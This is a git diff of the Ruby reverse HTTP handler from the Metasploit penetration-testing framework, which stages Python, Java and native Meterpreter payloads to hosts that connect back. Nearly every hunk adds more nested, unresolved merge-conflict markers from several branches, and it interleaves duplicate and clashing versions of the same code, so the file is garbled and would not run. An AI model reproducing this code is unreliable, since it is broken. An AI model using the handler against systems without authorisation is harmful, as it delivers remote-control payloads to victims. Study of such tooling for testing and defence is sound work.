@@ -22,6 +22,7 @@ module ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
   include Msf::Handler::Reverse
 =======
 >>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
@@ -31,6 +32,8 @@ module ReverseHttp
 >>>>>>> origin/msf-complex-payloads
 =======
 >>>>>>> origin/payload-generator.rb
+=======
+>>>>>>> origin/pod/metasploit-serialized_class_loader
   include Rex::Payloads::Meterpreter::UriChecksum
   include Msf::Payload::Windows::VerifySsl
 
@@ -68,6 +71,7 @@ module ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 
         OptString.new('MeterpreterUserAgent', [false, 'The user-agent that the payload should use for communication', Rex::UserAgent.shortest]),
         OptString.new('MeterpreterServerName', [false, 'The server header that the handler will send in response to requests', 'Apache']),
@@ -81,11 +85,14 @@ module ReverseHttp
 >>>>>>> origin/msf-complex-payloads
 =======
 >>>>>>> origin/payload-generator.rb
+=======
+>>>>>>> origin/pod/metasploit-serialized_class_loader
         OptString.new('ReverseListenerComm', [false, 'The specific communication channel to use for this listener']),
         OptString.new('MeterpreterUserAgent', [false, 'The user-agent that the payload should use for communication', Rex::UserAgent.shortest]),
         OptString.new('MeterpreterServerName', [false, 'The server header that the handler will send in response to requests', 'Apache']),
         OptAddress.new('ReverseListenerBindAddress', [false, 'The specific IP address to bind to on the local system']),
         OptInt.new('ReverseListenerBindPort', [false, 'The port to bind to on the local system if different from LPORT']),
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -99,6 +106,8 @@ module ReverseHttp
 >>>>>>> origin/msf-complex-payloads
 =======
 >>>>>>> origin/payload-generator.rb
+=======
+>>>>>>> origin/pod/metasploit-serialized_class_loader
         OptBool.new('OverrideRequestHost', [false, 'Forces a specific host and port instead of using what the client requests, defaults to LHOST:LPORT', false]),
         OptString.new('OverrideLHOST', [false, 'When OverrideRequestHost is set, use this value as the host name for secondary requests']),
         OptPort.new('OverrideLPORT', [false, 'When OverrideRequestHost is set, use this value as the port number for secondary requests']),
@@ -125,6 +134,7 @@ module ReverseHttp
   # @return [String] A URI of the form +scheme://host:port/+
   def listener_uri
     uri_host = Rex::Socket.is_ipv6?(listener_address) ? "[#{listener_address}]" : listener_address
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -199,6 +209,12 @@ module ReverseHttp
     "#{scheme}://#{uri_host}:#{datastore['LPORT']}/"
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
 >>>>>>> origin/pod/metasploit-framework
+=======
+    "#{scheme}://#{uri_host}:#{datastore['LPORT']}/"
+=======
+    "#{scheme}://#{uri_host}:#{bind_port}/"
+>>>>>>> rapid7/master
+>>>>>>> origin/pod/metasploit-serialized_class_loader
   end
 
   # Return a URI suitable for placing in a payload.
@@ -216,6 +232,7 @@ module ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> origin/msf-complex-payloads
     end
@@ -238,6 +255,10 @@ module ReverseHttp
     end
 
 >>>>>>> origin/payload-generator.rb
+=======
+    end
+
+>>>>>>> origin/pod/metasploit-serialized_class_loader
     # Override the host and port as appropriate
     if datastore['OverrideRequestHost'] || callback_host.nil?
       callback_name = datastore['OverrideLHOST'] || datastore['LHOST']
@@ -249,11 +270,14 @@ module ReverseHttp
     end
 
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> origin/msf-complex-payloads
 =======
 >>>>>>> origin/msf-complex-payloads
 =======
 >>>>>>> origin/payload-generator.rb
+=======
+>>>>>>> origin/pod/metasploit-serialized_class_loader
     "#{scheme}://#{callback_host}/"
   end
 
@@ -304,6 +328,7 @@ module ReverseHttp
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> origin/4.11.2_release_pre-rails4
 =======
 >>>>>>> origin/chore/MSP-12110/celluloid-supervision-tree
@@ -313,6 +338,8 @@ module ReverseHttp
 >>>>>>> origin/msf-complex-payloads
 =======
 >>>>>>> origin/payload-generator.rb
+=======
+>>>>>>> origin/pod/metasploit-serialized_class_loader
       (ssl?) ? datastore['HandlerSSLCert'] : nil
     )
 
@@ -403,12 +430,15 @@ protected
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
 >>>>>>> origin/msf-complex-payloads
 =======
 >>>>>>> origin/msf-complex-payloads
 =======
 >>>>>>> origin/payload-generator.rb
+=======
+>>>>>>> origin/pod/metasploit-serialized_class_loader
 
     # Configure the UUID architecture and payload if necessary
     uuid.arch      ||= obj.arch
@@ -416,6 +446,9 @@ protected
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
+=======
+>>>>>>> origin/pod/metasploit-serialized_class_loader
 
     conn_id = nil
     if info[:mode] && info[:mode] != :connect
@@ -423,6 +456,7 @@ protected
     end
 
     request_summary = "#{req.relative_resource} with UA '#{req.headers['User-Agent']}'"
+<<<<<<< HEAD
 
     # Validate known UUIDs for all requests if IgnoreUnknownPayloads is set
     if datastore['IgnoreUnknownPayloads'] && ! framework.uuid_db[uuid.puid_hex]
@@ -430,6 +464,15 @@ protected
       info[:mode] = :unknown_uuid
     end
 
+=======
+
+    # Validate known UUIDs for all requests if IgnoreUnknownPayloads is set
+    if datastore['IgnoreUnknownPayloads'] && ! framework.uuid_db[uuid.puid_hex]
+      print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Ignoring unknown UUID: #{request_summary}")
+      info[:mode] = :unknown_uuid
+    end
+
+>>>>>>> origin/pod/metasploit-serialized_class_loader
     # Validate known URLs for all session init requests if IgnoreUnknownPayloads is set
     if datastore['IgnoreUnknownPayloads'] && info[:mode].to_s =~ /^init_/
       allowed_urls = framework.uuid_db[uuid.puid_hex]['urls'] || []
@@ -438,6 +481,7 @@ protected
         info[:mode] = :unknown_uuid_url
       end
     end
+<<<<<<< HEAD
 
 =======
 
@@ -510,12 +554,16 @@ protected
 >>>>>>> origin/msf-complex-payloads
 =======
 >>>>>>> origin/payload-generator.rb
+=======
+
+>>>>>>> origin/pod/metasploit-serialized_class_loader
     self.pending_connections += 1
 
     # Process the requested resource.
     case info[:mode]
       when :init_connect
         print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Redirecting stageless connection from #{request_summary}")
+<<<<<<< HEAD
 
         # Handle the case where stageless payloads call in on the same URI when they
         # first connect. From there, we tell them to callback on a connect URI that
@@ -619,11 +667,43 @@ protected
           uuid: uuid,
           uri:  conn_id
         )
+=======
+<<<<<<< HEAD
 
-        var_escape = lambda { |txt|
-          txt.gsub('\\', '\\'*8).gsub('\'', %q(\\\\\\\'))
-        }
+        # Handle the case where stageless payloads call in on the same URI when they
+        # first connect. From there, we tell them to callback on a connect URI that
+        # was generated on the fly. This means we form a new session for each.
+>>>>>>> origin/pod/metasploit-serialized_class_loader
 
+        # Hurl a TLV back at the caller, and ignore the response
+        pkt = Rex::Post::Meterpreter::Packet.new(Rex::Post::Meterpreter::PACKET_TYPE_RESPONSE,
+                                                 'core_patch_url')
+        pkt.add_tlv(Rex::Post::Meterpreter::TLV_TYPE_TRANS_URL, conn_id + "/")
+        resp.body = pkt.to_r
+
+      when :init_python
+        print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Staging Python payload ...")
+        url = payload_uri(req) + conn_id + '/'
+
+        blob = ""
+        blob << obj.generate_stage(
+          uuid: uuid,
+          uri:  conn_id
+        )
+=======
+
+        # Handle the case where stageless payloads call in on the same URI when they
+        # first connect. From there, we tell them to callback on a connect URI that
+        # was generated on the fly. This means we form a new session for each.
+>>>>>>> rapid7/master
+
+        # Hurl a TLV back at the caller, and ignore the response
+        pkt = Rex::Post::Meterpreter::Packet.new(Rex::Post::Meterpreter::PACKET_TYPE_RESPONSE,
+                                                 'core_patch_url')
+        pkt.add_tlv(Rex::Post::Meterpreter::TLV_TYPE_TRANS_URL, conn_id + "/")
+        resp.body = pkt.to_r
+
+<<<<<<< HEAD
         # Patch all the things
         blob.sub!('HTTP_CONNECTION_URL = None', "HTTP_CONNECTION_URL = '#{var_escape.call(url)}'")
         blob.sub!('HTTP_USER_AGENT = None', "HTTP_USER_AGENT = '#{var_escape.call(datastore['MeterpreterUserAgent'])}'")
@@ -632,6 +712,7 @@ protected
           proxy_url = "http://#{datastore['PayloadProxyHost']||datastore['PROXYHOST']}:#{datastore['PayloadProxyPort']||datastore['PROXYPORT']}"
           blob.sub!('HTTP_PROXY = None', "HTTP_PROXY = '#{var_escape.call(proxy_url)}'")
         end
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -645,6 +726,23 @@ protected
 =======
 >>>>>>> 4.11.2_release_pre-rails4
 >>>>>>> origin/pod/metasploit-framework
+=======
+=======
+      when :init_python
+        print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Staging Python payload ...")
+        url = payload_uri(req) + conn_id + '/'
+
+        blob = ""
+        blob << obj.generate_stage(
+          http_url: url,
+          http_user_agent: datastore['MeterpreterUserAgent'],
+          http_proxy_host: datastore['PayloadProxyHost'] || datastore['PROXYHOST'],
+          http_proxy_port: datastore['PayloadProxyPort'] || datastore['PROXYPORT'],
+          uuid: uuid,
+          uri:  conn_id
+        )
+>>>>>>> rapid7/master
+>>>>>>> origin/pod/metasploit-serialized_class_loader
 
         resp.body = blob
 
@@ -662,6 +760,7 @@ protected
         })
 <<<<<<< HEAD
 <<<<<<< HEAD
+<<<<<<< HEAD
 
       when :init_java
         print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Staging Java payload ...")
@@ -672,14 +771,20 @@ protected
 =======
 
 >>>>>>> origin/payload-generator.rb
+=======
+
+>>>>>>> origin/pod/metasploit-serialized_class_loader
       when :init_java
         print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Staging Java payload ...")
         url = payload_uri(req) + conn_id + "/\x00"
 
 <<<<<<< HEAD
+<<<<<<< HEAD
 >>>>>>> origin/msf-complex-payloads
 =======
 >>>>>>> origin/payload-generator.rb
+=======
+>>>>>>> origin/pod/metasploit-serialized_class_loader
         blob = obj.generate_stage(
           uuid: uuid,
           uri:  conn_id
@@ -703,6 +808,7 @@ protected
       when :init_native
         print_status("#{cli.peerhost}:#{cli.peerport} (UUID: #{uuid.to_s}) Staging Native payload ...")
         url = payload_uri(req) + conn_id + "/\x00"
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -762,6 +868,11 @@ protected
 =======
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
 >>>>>>> origin/pod/metasploit-framework
+=======
+=======
+        uri = URI(payload_uri(req) + conn_id)
+>>>>>>> rapid7/master
+>>>>>>> origin/pod/metasploit-serialized_class_loader
 
         resp['Content-Type'] = 'application/octet-stream'
 
@@ -770,6 +881,7 @@ protected
         blob = obj.stage_payload(
           uuid: uuid,
           uri:  conn_id,
+<<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
 <<<<<<< HEAD
@@ -894,6 +1006,14 @@ protected
           lport: datastore['OverrideRequestHost'] ? datastore['OverrideLPORT'] : datastore['LPORT']
 >>>>>>> chore/MSP-12110/celluloid-supervision-tree
 >>>>>>> origin/pod/metasploit-framework
+=======
+          lhost: datastore['OverrideRequestHost'] ? datastore['OverrideLHOST'] : (req && req.headers && req.headers['Host']) ? req.headers['Host'] : datastore['LHOST'],
+          lport: datastore['OverrideRequestHost'] ? datastore['OverrideLPORT'] : datastore['LPORT']
+=======
+          lhost: uri.host,
+          lport: uri.port
+>>>>>>> rapid7/master
+>>>>>>> origin/pod/metasploit-serialized_class_loader
         )
 
         resp.body = encode_stage(blob)
